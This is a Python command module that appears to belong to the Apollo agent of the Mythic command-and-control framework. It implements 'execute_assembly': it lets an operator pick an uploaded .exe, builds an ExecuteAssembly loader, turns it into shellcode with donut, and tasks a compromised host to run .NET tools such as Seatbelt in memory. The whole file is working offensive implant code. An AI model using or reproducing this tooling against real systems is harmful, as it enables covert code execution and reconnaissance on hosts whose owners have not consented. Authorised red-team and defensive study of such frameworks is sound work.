from distutils.dir_util import copy_tree
import shutil
import tempfile
from mythic_container.MythicCommandBase import *
from uuid import uuid4
from mythic_container.MythicRPC import *
from os import path
import asyncio
import donut
import platform

if platform.system() == "Windows":
    EXEECUTE_ASSEMBLY_PATH = "C:\\Mythic\\Apollo\\srv\\ExecuteAssembly.exe"
else:
    EXEECUTE_ASSEMBLY_PATH = "/srv/ExecuteAssembly.exe"


class ExecuteAssemblyArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="assembly_name",
                cli_name="Assembly",
                display_name="Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Assembly to execute (e.g., Seatbelt.exe).",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, group_name="Default", ui_position=1
                    )
                ],
            ),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=2
                    ),
                ],
            ),
        ]

    async def get_files(
        self, inputMsg: PTRPCDynamicQueryFunctionMessage
    ) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        file_resp = await SendMythicRPCFileSearch(
            MythicRPCFileSearchMessage(
                CallbackID=inputMsg.Callback,
                LimitByCallback=True,
                Filename="",
            )
        )
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = file_resp.Error
            return fileResponse

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require an assembly to execute.\n\tUsage: {}".format(
                    ExecuteAssemblyCommand.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("assembly_name", parts[0])
            self.add_arg("assembly_arguments", "")
            if len(parts) == 2:
                self.add_arg("assembly_arguments", parts[1])


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly [Assembly.exe] [args]"
    description = "Executes a .NET assembly with the specified arguments. This assembly must first be known by the agent using the `register_assembly` command."
    version = 3
    author = "@djhohnstein"
    argument_class = ExecuteAssemblyArguments
    attackmapping = ["T1547"]

    async def build_exeasm(self):
        try:
            global EXEECUTE_ASSEMBLY_PATH
            agent_build_path = tempfile.TemporaryDirectory()
            outputPath = "{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(
                agent_build_path.name
            )
            # shutil to copy payload files over
            copy_tree(str(self.agent_code_path), agent_build_path.name)
            shell_cmd = "dotnet build -c release -p:Platform=x64 {}/ExecuteAssembly/ExecuteAssembly.csproj -o {}/ExecuteAssembly/bin/Release/".format(
                agent_build_path.name, agent_build_path.name
            )
            proc = await asyncio.create_subprocess_shell(
                shell_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path.name,
            )
            stdout, stderr = await proc.communicate()
            if not path.exists(outputPath):
                raise Exception(
                    "Failed to build ExecuteAssembly.exe:\n{}".format(
                        stderr.decode() + "\n" + stdout.decode()
                    )
                )
            shutil.copy(outputPath, EXEECUTE_ASSEMBLY_PATH)
        except Exception as ex:
            raise Exception(ex)

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global EXEECUTE_ASSEMBLY_PATH
        taskData.args.add_arg("pipe_name", str(uuid4()))
        if not path.exists(EXEECUTE_ASSEMBLY_PATH):
            # create
            await self.build_exeasm()

        donutPic = donut.create(
            file=EXEECUTE_ASSEMBLY_PATH, params=taskData.args.get_arg("pipe_name")
        )
        file_resp = await SendMythicRPCFileCreate(
            MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID, FileContents=donutPic, DeleteAfterFetch=True
            )
        )
        if file_resp.Success:
            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
        else:
            raise Exception(
                "Failed to register execute_assembly binary: " + file_resp.Error
            )

        taskargs = taskData.args.get_arg("assembly_arguments")
        if taskargs == "" or taskargs is None:
            response.DisplayParams = "-Assembly {}".format(
                taskData.args.get_arg("assembly_name")
            )
        else:
            response.DisplayParams = "-Assembly {} -Arguments {}".format(
                taskData.args.get_arg("assembly_name"), taskargs
            )

        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
